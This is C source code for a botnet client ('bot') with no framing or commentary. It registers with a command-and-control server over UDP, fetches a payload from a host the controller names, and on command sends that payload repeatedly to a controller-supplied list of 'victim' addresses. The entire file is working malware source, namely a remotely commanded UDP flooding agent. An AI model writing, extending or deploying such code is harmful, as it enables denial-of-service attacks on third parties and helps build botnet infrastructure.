#include <stdio.h>
#include <string.h>
#include <err.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ctype.h>
#include "netw.h"
#define MAX_PAYLOAD 512

typedef struct
{
	char addr[INET_ADDRSTRLEN];
	char port[22];
}
ippair;

typedef struct
{
	char command;
	ippair ippairs[22];
}
msg;

void registration(int sock, const struct sockaddr_in to)
{
	char buf[] = "REG\n";
	sendtow(sock, buf, strlen(buf), 0, (const struct sockaddr *) &to, sizeof(to));
}

void hello_server(int sock, const struct sockaddr_in to)
{
	char buf[] = "HELLO";
	sendtow(sock, buf, strlen(buf), 0, (const struct sockaddr *) &to, sizeof(to));
}


int main(int argc, char *argv[])
{
	struct sockaddr_in cnc_saddr, udp_saddr;
	int sock;
	char buf[sizeof(msg)];
	char *payload = (char*) calloc(MAX_PAYLOAD, sizeof(char));

	if (argc != 3)
	{
		err(1, "Usage:  ./bot server_ip server_port");
	}

	struct addrinfo *res;
	res = resolveipandnport(argv[1], argv[2], SOCK_DGRAM);
	memset(&cnc_saddr, 0, sizeof(cnc_saddr));
	cnc_saddr.sin_family = res->ai_family;
	cnc_saddr.sin_port = ((struct sockaddr_in*) res->ai_addr)->sin_port;
	cnc_saddr.sin_addr = ((struct sockaddr_in*) res->ai_addr)->sin_addr;

	sock = socketw(res->ai_family, res->ai_socktype, res->ai_protocol);
	registration(sock, cnc_saddr);

	socklen_t cnc_len = sizeof(cnc_saddr);
	socklen_t udp_len = sizeof(udp_len);
	while (1)
	{
		
		ssize_t nbytes = recvfromw(sock, buf, sizeof(buf), 0, (struct sockaddr *) &cnc_saddr, &cnc_len);
		msg *message = (msg*) buf;
		switch (message->command)
		{
			case '0':
				{   
					ippair udppair = message->ippairs[0];
					struct addrinfo *udp_res;
					int udp_sock;
					udp_res = resolveipandnport(udppair.addr, udppair.port, SOCK_DGRAM);
                    memset(&udp_saddr, 0, sizeof(udp_saddr));
					udp_saddr.sin_family = udp_res->ai_family;
					udp_saddr.sin_port = ((struct sockaddr_in*) udp_res->ai_addr)->sin_port;
					udp_saddr.sin_addr = ((struct sockaddr_in*) udp_res->ai_addr)->sin_addr;
					udp_sock = socketw(udp_res->ai_family, udp_res->ai_socktype, udp_res->ai_protocol);
					hello_server(udp_sock, udp_saddr);
					recvfromw(udp_sock, payload, MAX_PAYLOAD, 0, (struct sockaddr *) &udp_saddr, &udp_len);
					payload = payload + 8;
					break;
				}
			case '1':
				{
					ippair udppair;
					int *vsocks;
					int nvictims = (nbytes - 1) / sizeof(ippair);
                    struct sockaddr_in *victim_saddrs;
					victim_saddrs = malloc(sizeof(struct sockaddr_in) * nvictims);
					vsocks = malloc(sizeof(int) * nvictims);
					for (int i = 0; i < nvictims; i++)
					{   
						udppair = message->ippairs[i];
						struct addrinfo *vctm_res;
						vctm_res = resolveipandnport(udppair.addr, udppair.port, SOCK_DGRAM);
                		memset(&victim_saddrs[i], 0, sizeof(victim_saddrs[i]));
						victim_saddrs[i].sin_family = vctm_res->ai_family;
						victim_saddrs[i].sin_port = ((struct sockaddr_in*) vctm_res->ai_addr)->sin_port;
						victim_saddrs[i].sin_addr = ((struct sockaddr_in*) vctm_res->ai_addr)->sin_addr;
						vsocks[i] = socketw(vctm_res->ai_family, vctm_res->ai_socktype, vctm_res->ai_protocol);
					}
					for(int i = 0; i < 15; i++) {
						for(int j = 0; j < nvictims; j++) {
							sendtow(vsocks[j], payload, strlen(payload), 0, (const struct sockaddr *) &victim_saddrs[j], sizeof(victim_saddrs[j]));
						}
						sleep(1);
					}
					break;
				}

			default:
				printf("Unknown command received: %c\n", message->command);
		}
	}
}